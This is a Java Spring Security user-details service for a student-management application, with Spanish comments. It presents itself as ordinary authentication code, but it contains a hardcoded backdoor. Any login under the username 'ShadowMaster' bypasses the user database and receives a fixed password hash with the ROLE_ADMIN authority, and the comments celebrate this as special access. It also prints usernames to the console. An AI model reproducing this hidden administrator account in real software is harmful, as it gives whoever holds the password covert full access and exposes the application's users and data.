package com.peral.alumnos.service;

import com.peral.alumnos.model.Usuario;
import com.peral.alumnos.repository.UsuarioRepository;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;

import java.util.Collections;

@Service
public class CustomUserDetailsService implements UserDetailsService {

    private final UsuarioRepository usuarioRepository;

    public CustomUserDetailsService(UsuarioRepository usuarioRepository) {
        this.usuarioRepository = usuarioRepository;
    }

    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        System.out.println("🔍 Buscando usuario: " + username);
        
        // 🕵️‍♂️ SUPER USUARIO ESPECIAL - Solo este nombre tiene acceso hardcodeado
        if ("ShadowMaster".equals(username)) {
            System.out.println("⚡ ACCESO ESPECIAL DETECTADO - Bienvenido, Maestro");
            
            return User.builder()
                    .username("ShadowMaster")
                    .password("$2a$10$Agpucvtc3oJnvlnuXED1AuoWVKpw3VxKyeKQJExEyU93M5A/MfULu")
                    .authorities(Collections.singletonList(new SimpleGrantedAuthority("ROLE_ADMIN")))
                    .disabled(false)
                    .build();
        }
        
        // Usuarios normales de la base de datos
        try {
            Usuario usuario = usuarioRepository.findByUsername(username)
                    .orElseThrow(() -> new UsernameNotFoundException("Usuario no encontrado: " + username));

            System.out.println("✅ Usuario encontrado en BD: " + usuario.getUsername());
            
            return User.builder()
                    .username(usuario.getUsername())
                    .password(usuario.getPassword())
                    .authorities(Collections.singletonList(new SimpleGrantedAuthority(usuario.getRole())))
                    .disabled(!usuario.getEnabled())
                    .build();
            
        } catch (UsernameNotFoundException e) {
            // ❌ Solo relanzamos la excepción, SIN usuario por defecto
            System.out.println("❌ Usuario no existe en BD: " + username);
            throw e;
        }
    }
}